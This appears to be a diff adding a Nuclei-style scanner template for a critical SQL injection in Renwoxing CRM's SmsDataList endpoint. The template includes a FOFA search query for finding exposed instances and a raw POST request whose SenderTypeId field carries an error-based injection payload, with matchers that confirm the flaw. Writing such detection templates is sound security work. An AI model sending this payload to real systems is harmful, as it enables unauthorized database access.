@@ -1,0 +1,31 @@
+id: renwoxing-CRM-SmsDataList-sqli
+
+info:
+  name: Renwoxing CRM SmsDataList SQL injection vulnerability(任我行 CRM SmsDataList SQL注入漏洞)
+  author: linfeng7z
+  severity: critical
+  tags: renwoxing,crm,sqli
+  metadata:
+    fofa-query: 'title="任我行CRM"'
+
+requests:
+  - raw:
+      - |
+        POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.1361.63 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 170
+        
+        Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=00000000' AND 9023 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (9023=9023) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(112)+CHAR(113))) AND 'OWbU'='OWbU
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_1, 'errorCode') && contains(body_1, 'CHAR')"
+          - "status_code_1 == 200"
+        condition: and
